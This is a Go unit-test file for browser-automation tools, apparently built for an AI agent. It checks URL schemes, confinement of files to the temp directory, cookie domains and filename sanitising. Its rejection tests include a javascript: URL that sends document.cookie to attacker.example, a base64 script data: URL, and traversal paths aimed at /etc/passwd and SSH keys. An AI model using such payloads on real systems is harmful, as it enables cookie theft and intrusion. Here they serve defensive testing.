package tools

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// ── validateNavigationURL ────────────────────────────────────────────────────

func TestValidateNavigationURL_AcceptedSchemes(t *testing.T) {
	cases := []string{
		"https://example.com",
		"https://example.com/path?q=1#frag",
		"http://localhost:8080",
		"about:blank",
		"about:srcdoc",
		"  https://example.com  ", // surrounding whitespace tolerated
	}
	for _, in := range cases {
		t.Run(in, func(t *testing.T) {
			if err := validateNavigationURL(in); err != nil {
				t.Errorf("expected accepted, got error: %v", err)
			}
		})
	}
}

func TestValidateNavigationURL_RejectedSchemes(t *testing.T) {
	cases := map[string]string{
		"file":             "file:///etc/passwd",
		"chrome":           "chrome://settings",
		"chrome-extension": "chrome-extension://abcd/popup.html",
		"javascript":       "javascript:fetch('https://attacker.example?c='+document.cookie)",
		"data":             "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
		"vscode":           "vscode://settings",
		"mailto":           "mailto:user@example.com",
		"ftp":              "ftp://example.com",
		"ws":               "ws://example.com/socket",
	}
	for name, in := range cases {
		t.Run(name, func(t *testing.T) {
			err := validateNavigationURL(in)
			if err == nil {
				t.Fatalf("expected rejection, got nil error for %q", in)
			}
			if !strings.Contains(err.Error(), "not permitted") {
				t.Errorf("expected error mentioning 'not permitted', got %v", err)
			}
		})
	}
}

func TestValidateNavigationURL_EmptyOrSchemeless(t *testing.T) {
	tests := map[string]string{
		"empty":      "",
		"whitespace": "   ",
		"no-scheme":  "example.com",
	}
	for name, in := range tests {
		t.Run(name, func(t *testing.T) {
			if err := validateNavigationURL(in); err == nil {
				t.Fatalf("expected error for %q, got nil", in)
			}
		})
	}
}

// ── confineToTempDir ────────────────────────────────────────────────────

func TestConfineScreenshotPath_EmptyReturnsEmpty(t *testing.T) {
	got, err := confineToTempDir("")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if got != "" {
		t.Errorf("expected empty path passthrough, got %q", got)
	}
}

func TestConfineScreenshotPath_RelativeRejected(t *testing.T) {
	cases := []string{
		"relative.png",
		"./screenshot.png",
		"sub/dir/file.png",
		"../escape.png",
	}
	for _, in := range cases {
		t.Run(in, func(t *testing.T) {
			if _, err := confineToTempDir(in); err == nil {
				t.Fatalf("expected rejection of relative path %q", in)
			}
		})
	}
}

func TestConfineScreenshotPath_AcceptsTempDescendants(t *testing.T) {
	tempDir := os.TempDir()
	cases := []string{
		filepath.Join(tempDir, "shot.png"),
		filepath.Join(tempDir, "sub", "shot.png"),
	}
	for _, in := range cases {
		t.Run(in, func(t *testing.T) {
			got, err := confineToTempDir(in)
			if err != nil {
				t.Fatalf("expected accept, got %v", err)
			}
			if got != filepath.Clean(in) {
				t.Errorf("expected %q, got %q", filepath.Clean(in), got)
			}
		})
	}
}

func TestConfineScreenshotPath_RejectsOutsideTemp(t *testing.T) {
	cases := []string{
		"/etc/passwd",
		"/home/user/.ssh/authorized_keys",
		"/var/log/syslog",
		"/root/secret.png",
	}
	for _, in := range cases {
		t.Run(in, func(t *testing.T) {
			if _, err := confineToTempDir(in); err == nil {
				t.Fatalf("expected rejection of %q (outside temp)", in)
			}
		})
	}
}

func TestConfineScreenshotPath_RejectsTraversalEscapingTemp(t *testing.T) {
	tempDir := os.TempDir()
	// Constructed to land outside temp after Clean: tempDir/../etc/passwd
	traversal := filepath.Join(tempDir, "..", "etc", "passwd")
	if _, err := confineToTempDir(traversal); err == nil {
		t.Fatalf("expected traversal escape to be rejected: %q", traversal)
	}
}

// ── validateCookieDomain ─────────────────────────────────────────────────────

func TestValidateCookieDomain_EmptyAccepted(t *testing.T) {
	// Empty domain means "use the current page's host" — let the browser handle it.
	if err := validateCookieDomain("", "https://example.com/"); err != nil {
		t.Errorf("expected empty domain to be accepted, got %v", err)
	}
}

func TestValidateCookieDomain_ExactHostMatches(t *testing.T) {
	if err := validateCookieDomain("example.com", "https://example.com/"); err != nil {
		t.Errorf("expected exact host match, got %v", err)
	}
}

func TestValidateCookieDomain_CaseInsensitive(t *testing.T) {
	if err := validateCookieDomain("EXAMPLE.com", "https://example.COM/path"); err != nil {
		t.Errorf("expected case-insensitive match, got %v", err)
	}
}

func TestValidateCookieDomain_LeadingDotStripped(t *testing.T) {
	// `domain=.example.com` is the legacy syntax; equivalent to `domain=example.com`.
	if err := validateCookieDomain(".example.com", "https://example.com/"); err != nil {
		t.Errorf("expected leading-dot equivalence, got %v", err)
	}
	if err := validateCookieDomain(".example.com", "https://api.example.com/"); err != nil {
		t.Errorf("expected leading-dot subdomain, got %v", err)
	}
}

func TestValidateCookieDomain_SubdomainAccepted(t *testing.T) {
	// A page on api.example.com may set a cookie scoped to example.com (parent).
	if err := validateCookieDomain("example.com", "https://api.example.com/"); err != nil {
		t.Errorf("expected subdomain to be allowed for parent cookie, got %v", err)
	}
}

func TestValidateCookieDomain_UnrelatedRejected(t *testing.T) {
	// An attacker page must not be able to set cookies for a different origin.
	cases := map[string]struct{ domain, currentURL string }{
		"unrelated":     {"google.com", "https://attacker.example/"},
		"sibling":       {"other.example.com", "https://api.example.com/"},
		"superstring":   {"example.com.attacker.example", "https://example.com/"},
		"reverse-match": {"sub.api.example.com", "https://api.example.com/"}, // child of current page is NOT allowed (only parents)
	}
	for name, c := range cases {
		t.Run(name, func(t *testing.T) {
			err := validateCookieDomain(c.domain, c.currentURL)
			if err == nil {
				t.Fatalf("expected rejection: domain=%q url=%q", c.domain, c.currentURL)
			}
			if !strings.Contains(err.Error(), "does not match") {
				t.Errorf("expected 'does not match' in error, got %v", err)
			}
		})
	}
}

func TestValidateCookieDomain_NoHostInCurrentURL(t *testing.T) {
	cases := []string{
		"about:blank",
		"chrome://settings",
		"file:///tmp/foo.html",
	}
	for _, u := range cases {
		t.Run(u, func(t *testing.T) {
			if err := validateCookieDomain("example.com", u); err == nil {
				t.Errorf("expected rejection when current URL has no host: %q", u)
			}
		})
	}
}

func TestValidateCookieDomain_DotOnlyRejected(t *testing.T) {
	// `domain=.` strips to empty — a malformed input that should not silently
	// match every host.
	if err := validateCookieDomain(".", "https://example.com/"); err == nil {
		t.Error("expected rejection of bare-dot domain")
	}
}

// ── lookupNamedKey ───────────────────────────────────────────────────────────

func TestLookupNamedKey_KnownKeysAndAliases(t *testing.T) {
	cases := map[string]string{
		"Enter":      "Enter",
		"enter":      "Enter",
		"  ENTER  ":  "Enter",
		"Return":     "Enter",
		"Esc":        "Escape",
		"escape":     "Escape",
		"Tab":        "Tab",
		"Backspace":  "Backspace",
		"Delete":     "Delete",
		"Space":      " ",
		"ArrowUp":    "ArrowUp",
		"up":         "ArrowUp",
		"ArrowDown":  "ArrowDown",
		"DOWN":       "ArrowDown",
		"ArrowLeft":  "ArrowLeft",
		"left":       "ArrowLeft",
		"ArrowRight": "ArrowRight",
		"right":      "ArrowRight",
		"Home":       "Home",
		"End":        "End",
		"PageUp":     "PageUp",
		"PageDown":   "PageDown",
	}
	for in, wantKey := range cases {
		t.Run(in, func(t *testing.T) {
			nk, ok := lookupNamedKey(in)
			if !ok {
				t.Fatalf("expected lookupNamedKey(%q) to succeed", in)
			}
			if nk.Key != wantKey {
				t.Errorf("Key: got %q, want %q", nk.Key, wantKey)
			}
		})
	}
}

func TestLookupNamedKey_UnknownReturnsFalse(t *testing.T) {
	cases := []string{"a", "Q", "F1", "Shift", "Control", "Meta", "", "  "}
	for _, in := range cases {
		t.Run(in, func(t *testing.T) {
			if _, ok := lookupNamedKey(in); ok {
				t.Errorf("expected unknown key %q to return false, got true", in)
			}
		})
	}
}

func TestLookupNamedKey_ArrowKeysHaveVKeys(t *testing.T) {
	// The whole point of replacing the old keyChar() helper is that arrow
	// keys must dispatch real keyboard events. A zero VKey would mean the
	// new path silently degrades to the old broken behaviour.
	for _, name := range []string{"ArrowUp", "ArrowDown", "ArrowLeft", "ArrowRight"} {
		t.Run(name, func(t *testing.T) {
			nk, ok := lookupNamedKey(name)
			if !ok {
				t.Fatalf("lookupNamedKey(%q) failed", name)
			}
			if nk.WindowsVirtualKeyCode == 0 {
				t.Errorf("%s has WindowsVirtualKeyCode=0; JS keyCode listeners will see 0 as 'no key'", name)
			}
			if nk.Code != name {
				t.Errorf("%s Code: got %q, want %q", name, nk.Code, name)
			}
			if nk.Text != "" {
				t.Errorf("%s should not have Text (it's non-printable), got %q", name, nk.Text)
			}
		})
	}
}

func TestLookupNamedKey_PrintableKeysHaveText(t *testing.T) {
	// Enter, Tab, and Space have ASCII representations and should carry Text
	// so that input fields that listen to "input"/"keypress" events also
	// receive the character.
	cases := map[string]string{
		"Enter": "\r",
		"Tab":   "\t",
		"Space": " ",
	}
	for name, wantText := range cases {
		t.Run(name, func(t *testing.T) {
			nk, ok := lookupNamedKey(name)
			if !ok {
				t.Fatalf("lookupNamedKey(%q) failed", name)
			}
			if nk.Text != wantText {
				t.Errorf("Text: got %q, want %q", nk.Text, wantText)
			}
		})
	}
}

// ── xpathEscapeText edge cases ───────────────────────────────────────────────

func TestXpathEscapeText_NoQuotes(t *testing.T) {
	got := xpathEscapeText("Login")
	if got != "'Login'" {
		t.Errorf("got %q, want %q", got, "'Login'")
	}
}

func TestXpathEscapeText_OnlySingleQuote(t *testing.T) {
	// Falls into the "wrap in double quotes" branch.
	got := xpathEscapeText(`it's`)
	if got != `"it's"` {
		t.Errorf("got %q, want %q", got, `"it's"`)
	}
}

func TestXpathEscapeText_OnlyDoubleQuote(t *testing.T) {
	got := xpathEscapeText(`say "hi"`)
	if got != `'say "hi"'` {
		t.Errorf("got %q, want %q", got, `'say "hi"'`)
	}
}

func TestXpathEscapeText_BothQuotes_UsesConcat(t *testing.T) {
	// Must produce a syntactically valid concat() form.
	got := xpathEscapeText(`it's "fun"`)
	// The exact form is implementation detail; what matters is that it
	// starts with concat( and is a balanced expression with no empty
	// arguments (concat() with zero args is a parse error).
	if !strings.HasPrefix(got, "concat(") || !strings.HasSuffix(got, ")") {
		t.Fatalf("expected concat(...) form, got %q", got)
	}
	if strings.Contains(got, "concat()") {
		t.Errorf("concat() with no arguments is invalid XPath: %q", got)
	}
	if strings.Contains(got, ",,") {
		t.Errorf("empty argument inside concat is invalid XPath: %q", got)
	}
}

func TestXpathEscapeText_Empty(t *testing.T) {
	// Defensive: empty input should still produce a valid XPath string
	// expression rather than something that breaks downstream interpolation.
	got := xpathEscapeText("")
	if got != "''" {
		t.Errorf("got %q, want %q", got, "''")
	}
}

// ── browser_screenshot validation ────────────────────────────────────────────
//
// The format/quality validation paths run before any CDP call, so we can
// exercise them by invoking the tool's Run directly with no real browser.

func findBrowserTool(t *testing.T, name string) Tool {
	t.Helper()
	for _, tool := range NewBrowserTools(nil, 0) {
		if tool.GetName() == name {
			return tool
		}
	}
	t.Fatalf("tool %q not registered in NewBrowserTools", name)
	return nil
}

func TestBrowserScreenshot_RejectsUnknownFormat(t *testing.T) {
	tool := findBrowserTool(t, "browser_screenshot")
	res := tool.Run(map[string]any{"format": "webp"})
	if res.GetError() == nil {
		t.Fatal("expected error for unknown format")
	}
	if !strings.Contains(res.GetError().Error(), "format must be") {
		t.Errorf("expected format-validation error, got %v", res.GetError())
	}
}

func TestBrowserScreenshot_RejectsOutOfRangeQuality(t *testing.T) {
	tool := findBrowserTool(t, "browser_screenshot")
	cases := []int{0, -5, 101, 200}
	for _, q := range cases {
		t.Run(fmt.Sprintf("q=%d", q), func(t *testing.T) {
			res := tool.Run(map[string]any{"format": "jpeg", "quality": q})
			if res.GetError() == nil {
				t.Fatalf("expected error for quality=%d", q)
			}
			if !strings.Contains(res.GetError().Error(), "quality must be") {
				t.Errorf("expected quality-range error, got %v", res.GetError())
			}
		})
	}
}

// ── browser_upload_file validation ───────────────────────────────────────────

func TestBrowserUploadFile_RequiresSelector(t *testing.T) {
	tool := findBrowserTool(t, "browser_upload_file")
	res := tool.Run(map[string]any{"files": []any{"/tmp/x"}})
	if res.GetError() == nil {
		t.Fatal("expected error when selector is missing")
	}
	if !strings.Contains(res.GetError().Error(), "'selector' is required") {
		t.Errorf("got %v", res.GetError())
	}
}

func TestBrowserUploadFile_RequiresFilesArray(t *testing.T) {
	tool := findBrowserTool(t, "browser_upload_file")
	cases := map[string]any{
		"missing":      map[string]any{"selector": "#x"},
		"empty-array":  map[string]any{"selector": "#x", "files": []any{}},
		"wrong-type":   map[string]any{"selector": "#x", "files": "not-an-array"},
		"non-string":   map[string]any{"selector": "#x", "files": []any{42}},
	}
	for name, params := range cases {
		t.Run(name, func(t *testing.T) {
			p := params.(map[string]any)
			res := tool.Run(p)
			if res.GetError() == nil {
				t.Fatalf("expected error for %s, got success: %v", name, res.GetContent())
			}
		})
	}
}

func TestBrowserUploadFile_RejectsRelativePath(t *testing.T) {
	tool := findBrowserTool(t, "browser_upload_file")
	res := tool.Run(map[string]any{
		"selector": "#upload",
		"files":    []any{"relative/path.txt"},
	})
	if res.GetError() == nil {
		t.Fatal("expected error for relative path")
	}
	if !strings.Contains(res.GetError().Error(), "absolute path") {
		t.Errorf("got %v", res.GetError())
	}
}

func TestBrowserUploadFile_RejectsMissingFile(t *testing.T) {
	tool := findBrowserTool(t, "browser_upload_file")
	res := tool.Run(map[string]any{
		"selector": "#upload",
		"files":    []any{"/nonexistent/path/file.txt"},
	})
	if res.GetError() == nil {
		t.Fatal("expected error for missing file")
	}
	if !strings.Contains(res.GetError().Error(), "cannot be read") {
		t.Errorf("got %v", res.GetError())
	}
}

func TestBrowserUploadFile_RejectsDirectory(t *testing.T) {
	tool := findBrowserTool(t, "browser_upload_file")
	dir := t.TempDir()
	res := tool.Run(map[string]any{
		"selector": "#upload",
		"files":    []any{dir},
	})
	if res.GetError() == nil {
		t.Fatal("expected error when path is a directory")
	}
	if !strings.Contains(res.GetError().Error(), "is a directory") {
		t.Errorf("got %v", res.GetError())
	}
}

func TestBrowserUploadFile_AcceptsExistingAbsolutePath(t *testing.T) {
	// Validation must succeed (we don't actually do the upload because that
	// would need a real browser; but every check before the CDP round-trip
	// should pass cleanly).
	dir := t.TempDir()
	path := filepath.Join(dir, "upload.txt")
	if err := os.WriteFile(path, []byte("hello"), 0o600); err != nil {
		t.Fatalf("seed file: %v", err)
	}
	// We can't easily assert the success path here without a browser, but we
	// can assert that validation is fine and the failure (if any) comes from
	// the CDP-pool layer, not from path validation.
	_, err := stringSliceParam(map[string]any{"files": []any{path}}, "files")
	if err != nil {
		t.Fatalf("stringSliceParam should accept []any{string}: %v", err)
	}
}

// ── stringSliceParam ─────────────────────────────────────────────────────────

func TestStringSliceParam_AcceptsBothShapes(t *testing.T) {
	// Both []string and []any-of-strings are valid; the upstream decoder
	// can produce either depending on the JSON path.
	asString, err := stringSliceParam(map[string]any{"x": []string{"a", "b"}}, "x")
	if err != nil {
		t.Errorf("[]string: %v", err)
	} else if len(asString) != 2 || asString[0] != "a" || asString[1] != "b" {
		t.Errorf("[]string: got %v", asString)
	}

	asAny, err := stringSliceParam(map[string]any{"x": []any{"a", "b"}}, "x")
	if err != nil {
		t.Errorf("[]any: %v", err)
	} else if len(asAny) != 2 || asAny[0] != "a" || asAny[1] != "b" {
		t.Errorf("[]any: got %v", asAny)
	}
}

func TestStringSliceParam_RejectsNonStringItem(t *testing.T) {
	_, err := stringSliceParam(map[string]any{"x": []any{"ok", 42}}, "x")
	if err == nil {
		t.Fatal("expected error for non-string item")
	}
	if !strings.Contains(err.Error(), "want string") {
		t.Errorf("got %v", err)
	}
}

func TestStringSliceParam_RejectsWrongType(t *testing.T) {
	_, err := stringSliceParam(map[string]any{"x": "scalar"}, "x")
	if err == nil {
		t.Fatal("expected error for non-array")
	}
	if !strings.Contains(err.Error(), "must be an array") {
		t.Errorf("got %v", err)
	}
}

func TestStringSliceParam_RejectsMissingKey(t *testing.T) {
	_, err := stringSliceParam(map[string]any{}, "x")
	if err == nil {
		t.Fatal("expected error when key absent")
	}
}

// ── browser_download_file validation ─────────────────────────────────────────

func TestBrowserDownloadFile_RequiresSelector(t *testing.T) {
	tool := findBrowserTool(t, "browser_download_file")
	res := tool.Run(map[string]any{})
	if res.GetError() == nil {
		t.Fatal("expected error when selector is missing")
	}
	if !strings.Contains(res.GetError().Error(), "'selector' is required") {
		t.Errorf("got %v", res.GetError())
	}
}

func TestBrowserDownloadFile_RejectsTimeoutTooSmall(t *testing.T) {
	tool := findBrowserTool(t, "browser_download_file")
	res := tool.Run(map[string]any{
		"selector":   "#download",
		"timeout_ms": 500,
	})
	if res.GetError() == nil {
		t.Fatal("expected error for timeout_ms below minimum")
	}
	if !strings.Contains(res.GetError().Error(), "timeout_ms must be at least") {
		t.Errorf("got %v", res.GetError())
	}
}

func TestBrowserDownloadFile_RejectsSavePathOutsideTemp(t *testing.T) {
	tool := findBrowserTool(t, "browser_download_file")
	res := tool.Run(map[string]any{
		"selector":  "#download",
		"save_path": "/etc/passwd",
	})
	if res.GetError() == nil {
		t.Fatal("expected error for save_path outside temp dir")
	}
	if !strings.Contains(res.GetError().Error(), "must be inside") {
		t.Errorf("got %v", res.GetError())
	}
}

// ── sanitizeFilename ─────────────────────────────────────────────────────────

func TestSanitizeFilename_StripsPathTraversal(t *testing.T) {
	cases := map[string]string{
		// Linux / Unix path traversal — Base() always returns the last segment.
		"../etc/passwd":           "passwd",
		"/etc/passwd":             "passwd",
		"../../home/user/.ssh/id": "id",
		"foo/bar/baz.txt":         "baz.txt",
		// Windows path traversal — Chrome may emit either separator.
		`..\Windows\System32\foo`: "foo",
		`C:\secret.txt`:           "secret.txt",
	}
	for in, want := range cases {
		t.Run(in, func(t *testing.T) {
			got := sanitizeFilename(in)
			if got != want {
				t.Errorf("got %q, want %q", got, want)
			}
		})
	}
}

func TestSanitizeFilename_StripsLeadingDots(t *testing.T) {
	// `..report.csv` would become hidden / malformed; we strip the dots.
	got := sanitizeFilename("..report.csv")
	if got != "report.csv" {
		t.Errorf("got %q, want %q", got, "report.csv")
	}
	// Normal filenames are unaffected.
	if got := sanitizeFilename("data.csv"); got != "data.csv" {
		t.Errorf("got %q, want %q", got, "data.csv")
	}
}

func TestSanitizeFilename_DropsReservedChars(t *testing.T) {
	// Windows-reserved characters and null bytes are dropped.
	got := sanitizeFilename("re:p<o>r|t?\x00.csv")
	if got != "report.csv" {
		t.Errorf("got %q, want %q", got, "report.csv")
	}
}

func TestSanitizeFilename_AllUnsafeReturnsEmpty(t *testing.T) {
	cases := []string{
		"...",          // all dots
		"//",           // all separators
		":<>?\x00",     // all reserved chars
		"",             // already empty
	}
	for _, in := range cases {
		t.Run(in, func(t *testing.T) {
			if got := sanitizeFilename(in); got != "" {
				t.Errorf("expected empty for %q, got %q", in, got)
			}
		})
	}
}

func TestSanitizeFilename_PreservesUnicode(t *testing.T) {
	// Non-ASCII characters are valid in filenames and must pass through.
	in := "ファイル.csv"
	if got := sanitizeFilename(in); got != in {
		t.Errorf("got %q, want %q", got, in)
	}
}

// ── resolveFrame ─────────────────────────────────────────────────────────────
//
// The non-empty frameSelector path needs a live CDP context (DescribeNode on a
// real iframe in a real document); we don't unit-test that here. The empty
// path returns the trivial chromedp.ByQuery option synchronously without any
// CDP traffic, which we can verify directly.

func TestResolveFrame_EmptyReturnsTopFrameOpts(t *testing.T) {
	opts, err := resolveFrame(context.Background(), "")
	if err != nil {
		t.Fatalf("unexpected error for empty frame: %v", err)
	}
	if len(opts) == 0 {
		t.Fatal("expected at least one query option for the top frame")
	}
}

// ── frame parameter wiring ───────────────────────────────────────────────────
//
// Verify every tool that should accept a `frame` parameter actually advertises
// it in its schema. Catches the silent-drop case where someone adds a new
// tool, forgets to plumb iframe support, and the agent silently runs every
// query in the top frame.

func TestBrowserTools_FrameParameterPresence(t *testing.T) {
	expectFrame := map[string]bool{
		"browser_click":         true,
		"browser_type":          true,
		"browser_fill":          true,
		"browser_select":        true,
		"browser_key":           true,
		"browser_get_text":      true,
		"browser_get_html":      true,
		"browser_wait":          true,
		"browser_scroll":        true,
		"browser_upload_file":   true,
		"browser_download_file": true,
	}

	for _, tool := range NewBrowserTools(nil, 0) {
		want := expectFrame[tool.GetName()]
		if !want {
			continue
		}
		t.Run(tool.GetName(), func(t *testing.T) {
			schema := tool.GetParameters()
			props, _ := schema["properties"].(map[string]any)
			if _, ok := props["frame"]; !ok {
				t.Errorf("%s: schema missing `frame` property — iframe scoping is not wired up", tool.GetName())
			}
		})
	}
}

// ── selectDocScopeJS ─────────────────────────────────────────────────────────

func TestSelectDocScopeJS_EmptyFrameReturnsTopDoc(t *testing.T) {
	js := selectDocScopeJS("")
	if !strings.Contains(js, "var doc = document") {
		t.Errorf("expected top-frame document fallback, got: %s", js)
	}
	// Must NOT call querySelector for a frame in this branch.
	if strings.Contains(js, "querySelector") {
		t.Errorf("empty frameSelector should not emit a querySelector call: %s", js)
	}
}

func TestSelectDocScopeJS_FrameQueriesContentDocument(t *testing.T) {
	js := selectDocScopeJS("#payment-iframe")
	checks := []string{
		`document.querySelector("#payment-iframe")`,
		"contentDocument",
		"var doc =",
		"error: frame became inaccessible",
	}
	for _, want := range checks {
		if !strings.Contains(js, want) {
			t.Errorf("expected %q in:\n%s", want, js)
		}
	}
}

func TestSelectDocScopeJS_FrameSelectorIsEscaped(t *testing.T) {
	// %q escapes embedded quotes so the JS string literal stays valid.
	// A frame selector with " or \ must not break out of the string.
	got := selectDocScopeJS(`iframe[name="quoted"]`)
	if strings.Contains(got, `iframe[name="quoted"]`) {
		t.Errorf("expected %%q escaping; raw quotes leaked into JS:\n%s", got)
	}
	// Still must reference the (escaped) selector twice — once in
	// querySelector, once in the error message — so a frame disappearing
	// at runtime is reported with the offending selector.
	if strings.Count(got, "quoted") != 2 {
		t.Errorf("expected two references to the frame selector, got:\n%s", got)
	}
}

// ── browser_click frame + text combination ───────────────────────────────────

func TestBrowserClick_RejectsTextWithFrame(t *testing.T) {
	tool := findBrowserTool(t, "browser_click")
	res := tool.Run(map[string]any{
		"text":  "Login",
		"frame": "#payment-iframe",
	})
	if res.GetError() == nil {
		t.Fatal("expected error when text + frame combined")
	}
	if !strings.Contains(res.GetError().Error(), "text-based matching cannot be scoped") {
		t.Errorf("got %v", res.GetError())
	}
}

// ── Schema regression guards ─────────────────────────────────────────────────
//
// The schema-regression guard previously lived here, scoped to browser tools
// only. It has been promoted to schemas_test.go where it covers every tool
// collection (native + memory + email) via a shared helper. Browser tools
// flow through that test as part of NewNativeTools.
